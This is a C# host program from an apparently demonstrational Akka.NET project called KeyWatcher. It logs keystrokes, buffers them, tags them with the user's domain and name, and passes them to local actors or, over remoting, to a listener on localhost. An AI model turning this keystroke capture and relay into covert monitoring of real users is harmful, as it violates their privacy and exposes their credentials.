using Akka.Actor;
using Akka.Configuration;
using Akka.DI.AutoFac;
using Akka.DI.Core;
using Autofac;
using KeyWatcher.Actors;
using KeyWatcher.Dependencies;
using KeyWatcher.Messages;
using System;
using System.Reactive.Linq;
using System.Windows.Forms;

namespace KeyWatcher.Host
{
	class Program
	{
		private const ushort BufferSize = 20;

		static void Main(string[] args)
		{
			//Program.UseSimpleKeyWatcher();
			//Program.UseBufferedKeyWatcher();
			Program.UseAkkaLocally();
			//Program.UseAkkaWithRemoting();
			//Program.UseAkkaWithRemotingWithQuietness();
		}

		private static void UseBufferedKeyWatcher()
		{
			using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
			{
				keyLogger.KeysLogged += (s, e) => Console.WriteLine(e.Keys);
				Application.Run();
			}
		}

		private static void UseSimpleKeyWatcher()
		{
			using (var keyLogger = new EventedKeyWatcher())
			{
				keyLogger.KeyLogged += (s, e) => Console.Write(e.Key);
				Application.Run();
			}
		}

		private static void UseAkkaLocally()
		{
			var builder = new ContainerBuilder();
			builder.RegisterModule<DependenciesModule>();
			builder.RegisterModule<ActorsModule>();
			var container = builder.Build();

			var userName = Program.GetUserName();

			using (var system = ActorSystem.Create("KeyWatcherHost"))
			{
				new AutoFacDependencyResolver(container, system);

				var users = system.ActorOf(system.DI().Props<UsersActor>(), "users");

				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						users.Tell(new UserKeysMessage(userName, e.Keys));
					};

					Application.Run();
				}
			}
		}

		private static void UseAkkaWithRemoting()
		{
			var config = ConfigurationFactory.ParseString(@"
akka {
    actor {
        provider = ""Akka.Remote.RemoteActorRefProvider, Akka.Remote""
    }
    remote {
        helios.tcp {
            port = 0
            hostname = localhost
        }
    }
}
");

			var userName = Program.GetUserName();

			using (var system = ActorSystem.Create("KeyWatcherHost", config))
			{
				var users = system
					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/users");

				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						users.Tell(new UserKeysMessage(userName, e.Keys));
					};

					Application.Run();
				}
			}
		}

		private static void UseAkkaWithRemotingWithQuietness()
		{
			var config = ConfigurationFactory.ParseString(@"
akka {
    actor {
        provider = ""Akka.Remote.RemoteActorRefProvider, Akka.Remote""
    }
    remote {
        helios.tcp {
            port = 0
            hostname = localhost
        }
    }
}
");

			var userName = Program.GetUserName();
			using (var system = ActorSystem.Create("KeyWatcherHost", config))
			{
				var users = system
					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/users");

				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
				{
					keyLogger.KeysLogged += (s, e) =>
					{
						users.Tell(new UserKeysMessage(userName, e.Keys));
					};

					var quietObservation =
						Observable.FromEventPattern<BufferedKeysEventArgs>(
							keyLogger, nameof(BufferedKeyWatcher.KeysLogged));

					using (var quietSubscription = quietObservation
						.Throttle(TimeSpan.FromSeconds(2))
						.Subscribe(args => Console.Out.WriteLine("It's quiet in here...")))
					{
						Application.Run();
					}
				}
			}
		}

		private static string GetUserName() => $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName + "-" : string.Empty)}{Environment.UserName}";
	}
}
